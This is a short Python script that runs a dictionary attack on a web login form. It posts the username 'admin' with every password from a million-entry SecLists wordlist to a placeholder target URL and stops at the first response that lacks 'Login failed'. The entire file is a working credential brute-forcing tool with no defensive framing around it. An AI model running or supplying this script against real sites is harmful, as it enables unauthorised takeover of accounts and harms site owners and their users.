#!/usr/bin/env python

import requests


target_url = "http://targeturlhere"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")